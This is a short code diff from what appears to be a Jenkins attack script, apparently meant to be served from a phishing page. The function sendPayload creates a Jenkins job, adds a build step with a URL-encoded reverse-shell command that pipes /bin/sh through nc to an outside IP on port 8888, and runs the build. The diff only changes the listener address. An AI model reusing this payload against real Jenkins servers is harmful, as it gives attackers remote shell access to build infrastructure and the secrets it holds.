@@ -59,7 +59,7 @@ So if you want to host script on some phishy domain, it will work only on jenkin
         }
 
         function sendPayload(name, payload, host){
-          var Payload = "mknod+%2Ftmp%2Fbackpipe+p+%26%26+%2Fbin%2Fsh+0%3C%2Ftmp%2Fbackpipe+%7C+nc+192.168.100.2+8888+1%3E%2Ftmp%2Fbackpipe";
+          var Payload = "mknod+%2Ftmp%2Fbackpipe+p+%26%26+%2Fbin%2Fsh+0%3C%2Ftmp%2Fbackpipe+%7C+nc+192.168.0.13+8888+1%3E%2Ftmp%2Fbackpipe";
           createJob(name, host);
           addBuildStep(name, Payload, host);
           rubBuild(name,host);
